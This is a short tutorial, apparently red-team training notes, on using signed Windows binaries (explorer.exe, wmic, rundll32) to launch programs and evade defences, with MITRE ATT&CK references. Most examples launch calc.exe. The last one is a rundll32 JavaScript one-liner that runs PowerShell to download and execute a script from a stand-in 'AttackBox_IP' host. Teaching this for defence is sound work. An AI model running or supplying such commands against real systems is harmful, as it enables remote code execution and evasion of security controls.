# File execution

## File Explorer

File Explorer is a pre-installed file manager and system component for Windows. People found that using the file 
explorer binary can execute other `.exe` files. This technique is called Indirect Command Execution, where the 
`explorer.exe` tool can be used and abused to launch malicious scripts or executables from a trusted parent process.

The `explorer.exe` binary is located at:

    C:\Windows\explorer.exe for the Windows 32 bits version
    C:\Windows\SysWOW64\explorer.exe for the Windows 64 bits version

In order to create a child process of `explorer.exe` parent (in this case `calc.exe`):

    explorer.exe /root,"C:\Windows\System32\calc.exe"

## WMIC

WMIC

Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People 
found that WMIC is also used to execute binaries for evading defensive measures. The MITRE ATT&CK framework refers 
to this technique as Signed Binary Proxy Execution ([T1218](https://attack.mitre.org/techniques/T1218/))

To create a new process of a binary of our choice (in this case `calc.exe` again):

    wmic.exe process call create calc

## Rundll32

Rundll32 is a pre-installed tool on Windows that loads and runs Dynamic Link Library DLL files within the OS. A red 
team can abuse and leverage `rundll32.exe` to run arbitrary payloads and execute JavaScript and PowerShell scripts.
The MITRE ATT&CK framework identifies this as "Signed Binary Proxy Execution: Rundll32" 
([T1218](https://attack.mitre.org/techniques/T1218/011/)).

The `rundll32.exe` binary is located at:

    C:\Windows\System32\rundll32.exe for the Windows 32 bits version
    C:\Windows\SysWOW64\rundll32.exe for the Windows 64 bits version

To execute a `calc.exe` binary as proof of concept using the `rundll32.exe` binary:

    rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");

To run a JavaScript that executes a PowerShell script to download from a remote website using `rundll32.exe`:

    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");


